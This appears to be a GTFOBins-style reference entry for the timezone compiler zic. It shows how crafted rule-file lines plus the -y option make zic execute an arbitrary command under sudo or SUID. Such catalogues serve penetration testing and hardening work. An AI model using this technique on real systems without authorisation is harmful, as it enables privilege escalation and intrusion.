title: zic
html:
zic

Command Execution

Context: sudo, suid, unprivileged

echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file
excerpt: zic Command Execution Context: sudo, suid, unprivileged echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/
